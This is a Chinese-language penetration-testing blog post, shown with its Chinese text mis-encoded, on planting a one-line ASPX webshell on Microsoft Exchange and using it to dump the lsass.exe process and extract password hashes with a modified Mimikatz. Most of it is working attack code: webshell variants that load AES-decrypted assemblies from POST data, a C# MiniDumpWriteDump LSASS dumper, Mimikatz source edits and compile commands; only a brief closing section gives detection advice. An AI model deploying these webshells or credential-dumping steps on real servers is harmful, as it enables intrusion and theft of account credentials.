I"¾6<h2 id="0x00-å‰è¨€">0x00 å‰è¨€</h2>
<hr />

<p>åœ¨ä¸Šä¸€ç¯‡æ–‡ç« <a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-Exchange%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%90%8E%E9%97%A8%E7%9A%84%E5%AE%9E%E7%8E%B0">ã€Šæ¸—é€åŸºç¡€â€”â€”Exchangeä¸€å¥è¯åé—¨çš„å®ç°ã€‹</a>ä»‹ç»äº†ä¸¤ç§Exchangeä¸€å¥è¯åé—¨(å†…å­˜åŠ è½½.netç¨‹åºé›†å’Œæ–‡ä»¶å†™å…¥)ï¼Œæœ¬æ–‡å°†è¦å¯¹Exchangeä¸€å¥è¯åé—¨çš„åŠŸèƒ½è¿›è¡Œæ‰©å±•ï¼Œä»¥å¯¼å‡ºlsassè¿›ç¨‹çš„å£ä»¤hashä¸ºä¾‹ï¼Œä»‹ç»å†…å­˜åŠ è½½PEæ–‡ä»¶çš„å®ç°æ–¹æ³•ï¼Œå¼€æºæµ‹è¯•ä»£ç ï¼Œåˆ†æåˆ©ç”¨æ€è·¯ï¼Œç»™å‡ºé˜²å¾¡å»ºè®®ã€‚</p>

<h2 id="0x01-ç®€ä»‹">0x01 ç®€ä»‹</h2>
<hr />

<p>æœ¬æ–‡å°†è¦ä»‹ç»ä»¥ä¸‹å†…å®¹ï¼š</p>

<ul>
  <li>Exchangeä¸€å¥è¯åé—¨çš„ç¼–å†™</li>
  <li>é€šè¿‡å†…å­˜åŠ è½½.netç¨‹åºé›†å®ç°å¯¼å‡ºlsass.exeè¿›ç¨‹çš„dmpæ–‡ä»¶</li>
  <li>é€šè¿‡å†…å­˜åŠ è½½PEæ–‡ä»¶å®ç°å†…å­˜åŠ è½½Mimikatzå¹¶è§£ææŒ‡å®šä½ç½®çš„dmpæ–‡ä»¶</li>
  <li>å¼€æºä»£ç </li>
  <li>é˜²å¾¡å»ºè®®</li>
</ul>

<h2 id="0x02-exchangeä¸€å¥è¯åé—¨çš„ç¼–å†™">0x02 Exchangeä¸€å¥è¯åé—¨çš„ç¼–å†™</h2>
<hr />

<h3 id="1åŸºæœ¬çš„å®ç°ä»£ç ">(1)åŸºæœ¬çš„å®ç°ä»£ç </h3>

<p>ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;%@ Page Language="C#" %&gt;&lt;%System.Reflection.Assembly.Load(Convert.FromBase64String(Request.Form["demodata"])).CreateInstance("Payload").Equals("");%&gt;
</code></pre></div></div>

<p>ä»£ç ä¼šåˆ¤æ–­æ˜¯å¦å¸¦æœ‰POSTè¯·æ±‚çš„å‚æ•°<code class="language-plaintext highlighter-rouge">demodata</code>ï¼Œå¦‚æœå­˜åœ¨ä¼šå°†POSTè¯·æ±‚ä¸­å‚æ•°<code class="language-plaintext highlighter-rouge">demodata</code>çš„å†…å®¹ä½œbase64è§£å¯†ï¼Œåœ¨å†…å­˜åŠ è½½å¹¶è°ƒç”¨åä¸ºPayloadçš„å®ä¾‹</p>

<h3 id="2å†°èçš„å®ç°ä»£ç ">(2)<a href="https://github.com/rebeyond/Behinder">å†°è</a>çš„å®ç°ä»£ç </h3>

<p>é»˜è®¤å¯åŠ¨ä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;%@ Page Language="C#" %&gt;&lt;%@Import Namespace="System.Reflection"%&gt;&lt;%Session.Add("k","e45e329feb5d925b"); byte[] k = Encoding.Default.GetBytes(Session[0] + ""),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);%&gt;
</code></pre></div></div>

<p>æå–å…¶ä¸­ä½¿ç”¨çš„è§£å¯†ä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public static string Decrypt(string str, string key)
{
    Byte[] toEncryptArray = Encoding.UTF8.GetBytes(str);           
    Byte[] toEncryptKey = Encoding.UTF8.GetBytes(key);
    Byte[] resultArray = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(toEncryptKey, toEncryptKey).TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length);
    return Encoding.UTF8.GetString(resultArray);
}
</code></pre></div></div>

<p>å‚ç…§è§£å¯†ä»£ç ï¼Œæ¨å‡ºå¯¹åº”çš„åŠ å¯†ä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   public static string Encrypt(string str, string key)
    {            
        Byte[] toEncryptArray = Encoding.UTF8.GetBytes(str);
        Byte[] toEncryptKey = Encoding.UTF8.GetBytes(key);
        //Byte[] resultArray = new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(toEncryptKey, toEncryptKey).TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length);
        RijndaelManaged rm = new RijndaelManaged
        {
            Mode = CipherMode.CBC,
            Padding = PaddingMode.PKCS7
        };
        ICryptoTransform cTransform = rm.CreateEncryptor(toEncryptKey, toEncryptKey);
        Byte[] resultArray = cTransform.TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length);
        return Encoding.UTF8.GetString(resultArray);      
    }
</code></pre></div></div>

<p>Exchangeä¸‹ç›´æ¥ä½¿ç”¨å†°èä¼šæŠ¥é”™ï¼Œé”™è¯¯åŸå› ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Session state can only be used when enableSessionState is set to true, either in a configuration file or in the Page directive. Please also make sure that System.Web.SessionStateModule or a custom session state module is included in the &lt;configuration&gt;\&lt;system.web&gt;\&lt;httpModules&gt; section in the application configuration.
</code></pre></div></div>

<p>è¿™é‡Œéœ€è¦ä¿®æ”¹Webshellè·¯å¾„å¯¹åº”çš„web.configæ–‡ä»¶ï¼Œæ‰¾åˆ°ä½ç½®ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;system.webServer&gt;
    &lt;modules&gt;
</code></pre></div></div>

<p>å»æ‰<code class="language-plaintext highlighter-rouge">&lt;remove name="Session" /&gt;</code>å³å¯</p>

<p>ç±»ä¼¼çš„è¿˜æœ‰<a href="https://github.com/BeichenDream/Godzilla/">Godzilla</a></p>

<h3 id="3ä¿®æ”¹åçš„å®ç°ä»£ç ">(3)ä¿®æ”¹åçš„å®ç°ä»£ç </h3>

<p>åœ¨Exchangeä¸‹åº”é¿å…ä½¿ç”¨Sessionä¼ é€’æ•°æ®ï¼Œè¿™é‡Œæ”¹ç”¨POSTè¯·æ±‚ä¼ é€’æ•°æ®ï¼Œæœ€ç»ˆä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;%@ Page Language="C#" %&gt;
&lt;%
if (Request.Form["k"]!=null&amp;&amp;Request.Form["data"]!=null)
{
    Byte[] k=Convert.FromBase64String(Request.Form["k"]);
    Byte[] c=Convert.FromBase64String(Request.Form["data"]);
    System.Reflection.Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this); 
}
%&gt;
</code></pre></div></div>

<p>POSTè¯·æ±‚ä¸­çš„å‚æ•°<code class="language-plaintext highlighter-rouge">k</code>ä½œä¸ºå¯†é’¥ï¼Œå‚æ•°<code class="language-plaintext highlighter-rouge">data</code>ä½œä¸ºåŠ å¯†çš„æ•°æ®ï¼Œè§£å¯†ååœ¨å†…å­˜åŠ è½½å¹¶è°ƒç”¨åä¸ºUçš„å®ä¾‹</p>

<p>æ¥ä¸‹æ¥ä¸¤èŠ‚å†…å®¹å°†ä»‹ç»è¿æ¥ä¸Šè¿°Exchangeä¸€å¥è¯åé—¨çš„å®¢æˆ·ç«¯å¼€å‘ç»†èŠ‚</p>

<h2 id="0x03-é€šè¿‡å†…å­˜åŠ è½½netç¨‹åºé›†å®ç°å¯¼å‡ºlsassexeè¿›ç¨‹çš„dmpæ–‡ä»¶">0x03 é€šè¿‡å†…å­˜åŠ è½½.netç¨‹åºé›†å®ç°å¯¼å‡ºlsass.exeè¿›ç¨‹çš„dmpæ–‡ä»¶</h2>
<hr />

<p>è¿™é‡Œéœ€è¦é€šè¿‡C#å®ç°å¯¼å‡ºlsass.exeè¿›ç¨‹dmpæ–‡ä»¶çš„åŠŸèƒ½</p>

<p>æ–°å»ºæ–‡ä»¶dumplsass.csï¼Œä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;
public class U
{
        [DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle hFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);
        public static bool IsHighIntegrity()
        {            
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
        public static void Minidump()
        {
            IntPtr targetProcessHandle = IntPtr.Zero;
            uint targetProcessId = 0;
            Process targetProcess = null;
            Process[] processes = Process.GetProcessesByName("lsass");
            targetProcess = processes[0];
            try
            {
                targetProcessId = (uint)targetProcess.Id;
                targetProcessHandle = targetProcess.Handle;
            }
            catch (Exception ex)
            {
                return;
            }
            string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
            string dumpFile = String.Format("{0}\\Temp\\lsass.bin", systemRoot);
            using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
            {
                MiniDumpWriteDump(targetProcessHandle, targetProcessId, fs.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            }
        }
        public override bool Equals(Object obj)
        {        
            Minidump();
            return true;
        }
}
</code></pre></div></div>

<p>ç¼–è¯‘ç”Ÿæˆdllæ–‡ä»¶ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library dumplsass.cs
</code></pre></div></div>

<p>ç”Ÿæˆçš„dumplsass.dllå³ä¸ºå®ç°å¯¼å‡ºlsass.exeè¿›ç¨‹dmpæ–‡ä»¶çš„Payloadæ•°æ®</p>

<p>åŠ è½½åè·å¾—lsass.exeè¿›ç¨‹çš„dmpæ–‡ä»¶ï¼Œä¿å­˜ä½ç½®ï¼š<code class="language-plaintext highlighter-rouge">C:\Windows\Temp\lsass.bin</code></p>

<h2 id="0x04-é€šè¿‡å†…å­˜åŠ è½½peæ–‡ä»¶å®ç°å†…å­˜åŠ è½½mimikatzå¹¶è§£ææŒ‡å®šä½ç½®çš„dmpæ–‡ä»¶">0x04 é€šè¿‡å†…å­˜åŠ è½½PEæ–‡ä»¶å®ç°å†…å­˜åŠ è½½Mimikatzå¹¶è§£ææŒ‡å®šä½ç½®çš„dmpæ–‡ä»¶</h2>
<hr />

<p>è¿™é‡Œåˆ†ä¸ºä¸¤é˜¶æ®µï¼š</p>

<ol>
  <li>é€šè¿‡C++å®ç°è§£ææŒ‡å®šä½ç½®çš„dmpæ–‡ä»¶å¹¶æå–hashï¼Œå¯ä»¥åœ¨Mimikatzçš„åŸºç¡€ä¸Šè¿›è¡Œä¿®æ”¹</li>
  <li>é€šè¿‡C#å®ç°å†…å­˜åŠ è½½PEæ–‡ä»¶çš„åŠŸèƒ½</li>
</ol>

<h3 id="1é€šè¿‡cå®ç°è§£ææŒ‡å®šä½ç½®çš„dmpæ–‡ä»¶å¹¶æå–hash">1.é€šè¿‡C++å®ç°è§£ææŒ‡å®šä½ç½®çš„dmpæ–‡ä»¶å¹¶æå–hash</h3>

<p>mimikatzè§£ææŒ‡å®šä½ç½®dmpæ–‡ä»¶çš„å‘½ä»¤ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe log "sekurlsa::minidump C:\Windows\Temp\lsass.bin" "sekurlsa::logonPasswords full" exit
</code></pre></div></div>

<p>ä¿®æ”¹mimikatzæºç ï¼Œæ¶‰åŠä»¥ä¸‹ä¸¤éƒ¨åˆ†ï¼š</p>

<p>æ‰‹åŠ¨ä¼ å…¥å‘½ä»¤å‚æ•°ï¼Œæ·»åŠ å¦‚ä¸‹ä»£ç ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    argc = 5;
    argv[1] = L"log";
    argv[2] = L"sekurlsa::minidump C:\\Windows\\Temp\\lsass.bin";
    argv[3] = L"sekurlsa::logonpasswords full";
    argv[4] = L"exit";
</code></pre></div></div>

<p>æŒ‡å®šæ—¥å¿—ä¿å­˜è·¯å¾„ä¸º<code class="language-plaintext highlighter-rouge">C:\Windows\Temp\mimikatz.log</code>ï¼Œä¿®æ”¹ä»¥ä¸‹ä»£ç ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#define MIMIKATZ_DEFAULT_LOG    L"C:\\Windows\\Temp\\" MIMIKATZ L".log"
</code></pre></div></div>

<p>ç¼–è¯‘åç”Ÿæˆæ–°çš„mimikatz.exe</p>

<h3 id="2é€šè¿‡cå®ç°å†…å­˜åŠ è½½peæ–‡ä»¶çš„åŠŸèƒ½">2.é€šè¿‡C#å®ç°å†…å­˜åŠ è½½PEæ–‡ä»¶çš„åŠŸèƒ½</h3>

<p>ä½¿ç”¨<a href="https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SharpPELoaderGenerater.cs">SharpPELoaderGenerater</a>è¯»å–æ–°ç”Ÿæˆçš„mimikatz.exeï¼Œç”Ÿæˆå¯ç”¨çš„å†…å­˜åŠ è½½ä»£ç SharpPELoader_x64.cs</p>

<p><strong>æ³¨ï¼š</strong></p>

<p>å†…å­˜åŠ è½½çš„å®ç°ç»†èŠ‚å¯å‚è€ƒ<a href="https://3gstudent.github.io/%E9%80%9A%E8%BF%87.NET%E5%AE%9E%E7%8E%B0%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BDPE%E6%96%87%E4%BB%B6">ã€Šé€šè¿‡.NETå®ç°å†…å­˜åŠ è½½PEæ–‡ä»¶ã€‹</a></p>

<p>ä¿®æ”¹SharpPELoader_x64.csçš„æ ¼å¼ï¼Œä½¿å…¶èƒ½å¤Ÿè¢«Exchangeä¸€å¥è¯åé—¨åŠ è½½ï¼Œå®Œæ•´ä»£ç å·²ä¸Šä¼ è‡³githubï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://github.com/3gstudent/test/blob/master/SharpPELoader_parselsass.cs</p>

<p>ç¼–è¯‘ç”Ÿæˆdllæ–‡ä»¶ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /target:library SharpPELoader_parselsass.cs
</code></pre></div></div>

<p>ç”Ÿæˆçš„SharpPELoader_parselsass.dllå³ä¸ºå®ç°å†…å­˜åŠ è½½Mimikatzè§£ædmpæ–‡ä»¶<code class="language-plaintext highlighter-rouge">C:\Windows\Temp\lsass.bin</code>å¹¶å°†å¯¼å‡ºç»“æœä¿å­˜ä¸º<code class="language-plaintext highlighter-rouge">C:\Windows\Temp\mimikatz.log</code>çš„Payloadæ•°æ®</p>

<h2 id="0x05-å¼€æºä»£ç ">0x05 å¼€æºä»£ç </h2>
<hr />

<p>å®Œæ•´çš„å®¢æˆ·ç«¯ä»£ç å·²ä¸Šä¼ è‡³githubï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SharpExchangeDumpHash.cs</p>

<p>ä½¿ç”¨C#å¼€å‘ï¼Œæ”¯æŒ.Net3.5åŠæ›´é«˜ç‰ˆæœ¬</p>

<p>ç¼–è¯‘å‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe /unsafe /platform:x64 SharpExchangeDumpHash.cs
or
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /platform:x64 SharpExchangeDumpHash.cs
</code></pre></div></div>

<p>ä»£ç æ”¯æŒä»¥ä¸‹ä¸‰ä¸ªåŠŸèƒ½ï¼š</p>

<ul>
  <li>generateï¼Œç”ŸæˆExchangeä¸€å¥è¯åé—¨</li>
  <li>dumplsassï¼Œè·å¾—lsassè¿›ç¨‹dmpæ–‡ä»¶</li>
  <li>parsedumpï¼Œè§£ædmpæ–‡ä»¶ï¼Œå¯¼å‡ºhash</li>
</ul>

<p>è¿æ¥Exchangeä¸€å¥è¯åé—¨æ—¶å¯é€‰æ‹©æ˜¯å¦ä½¿ç”¨å‡­æ®ç™»å½•ï¼Œé€šä¿¡æ•°æ®ä½¿ç”¨AESåŠ å¯†</p>

<p>ä»£ç ç»†èŠ‚ï¼š</p>

<p>POSTè¯·æ±‚ä¸­çš„å‚æ•°<code class="language-plaintext highlighter-rouge">k</code>ä½œä¸ºå¯†é’¥ï¼Œå‚æ•°<code class="language-plaintext highlighter-rouge">data</code>ä½œä¸ºåŠ å¯†çš„æ•°æ®</p>

<p>å­—ç¬¦ä¸²base64dumplsassä¸ºdumplsass.dllä½œBase64ç¼–ç åçš„ç»“æœ</p>

<p>å­—ç¬¦ä¸²base64parsedumpä¸ºparsedump.dllä½œBase64ç¼–ç åçš„ç»“æœ</p>

<h2 id="0x06-é˜²å¾¡å»ºè®®">0x06 é˜²å¾¡å»ºè®®</h2>
<hr />

<p>å¯¹äºExchangeä¸€å¥è¯åé—¨ï¼Œä¸ä»…éœ€è¦åˆ¤æ–­æ˜¯å¦æœ‰æ–°çš„æ–‡ä»¶å†™å…¥ï¼Œè¿˜éœ€è¦åˆ¤æ–­æ­£å¸¸çš„é¡µé¢æ˜¯å¦è¢«æ’å…¥æ¶æ„å†…å®¹ã€‚</p>

<p>åœ¨é™æ€åˆ†æä¸Šé¢ï¼Œå¯ä»¥æŸ¥çœ‹aspxæ–‡ä»¶ä¸­æ˜¯å¦åŒ…å«æ¶‰åŠå†…å­˜åŠ è½½çš„æ•æ„Ÿå‡½æ•°ï¼š</p>

<ul>
  <li>Assembly.Load</li>
  <li>Assembly.LoadFrom</li>
  <li>Assembly.LoadFile</li>
</ul>

<h2 id="0x07-å°ç»“">0x07 å°ç»“</h2>
<hr />

<p>æœ¬æ–‡å¯¹Exchangeä¸€å¥è¯åé—¨çš„åŠŸèƒ½è¿›è¡Œäº†æ‰©å±•ï¼Œä»¥å¯¼å‡ºlsassè¿›ç¨‹çš„å£ä»¤hashä¸ºä¾‹ï¼Œä»‹ç»äº†å†…å­˜åŠ è½½PEæ–‡ä»¶çš„å®ç°æ–¹æ³•ï¼Œå¼€æºæµ‹è¯•ä»£ç ï¼Œåˆ†æåˆ©ç”¨æ€è·¯ï¼Œç»™å‡ºé˜²å¾¡å»ºè®®ã€‚</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET